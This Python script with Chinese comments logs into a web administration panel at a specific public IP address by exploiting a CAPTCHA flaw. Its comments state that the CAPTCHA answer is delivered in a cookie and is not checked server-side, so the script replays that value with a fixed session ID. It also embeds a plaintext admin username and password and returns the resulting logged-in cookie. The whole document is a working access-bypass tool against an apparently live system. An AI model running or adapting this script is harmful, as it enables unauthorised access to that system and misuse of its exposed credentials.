# -*- coding=utf-8 -*-

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# 绕过验证码，得到登录后的check_code，拼接至cookie，返回可用的cookie
def login_to_system():
    login_head = {'Host': '124.160.57.2:28099',
                  'Origin': 'https://124.160.57.2:28099',
                  'Accept': '*/*',
                  'Accept-Encoding': 'gzip, deflate, br',
                  'Accept-Language': 'zh-CN,zh;q=0.9',
                  'Referer': 'https://124.160.57.2:28099/?q=common/login',
                  'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',

                  # check_code里 就是验证码的答案，由请求验证码图片url后 在response头部里自动set cookie
                  # 验证码 系统是随机得到 script的Math.random()，所以在前端并没有校验
                  'Cookie': 'PHPSESSID=7d3aecb7edc128d327c336ff3e3a43e1; check_code=js7i',
                  'X-Requested-With': 'XMLHttpRequest',
                  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36'
                  }

    client = requests.session()
    comment = client.post('https://124.160.57.2:28099/index.php?q=common/login',
                          headers=login_head,
                          params='q=common/login',

                          # 将cookie里check_code的验证码答案 填入data表单中这样服务器就能验证通过了。。。
                          data='name=admin&password=hzhby123!%40%23&checkcode=js7i&doLoginSubmit=1',
                          verify=False
                          )

    # 在response的头部里，cookie已被服务器重新set  取得服务器分配的 代表登录成功 的check_code=xxxx
    check_code = comment.headers['Set-Cookie'].split(';')[0]
    cookie = 'PHPSESSID=7d3aecb7edc128d327c336ff3e3a43e1; ' + check_code  # 拼接cookie并返回
    # print(cookie)
    return cookie


if __name__ == '__main__':
    print(login_to_system())
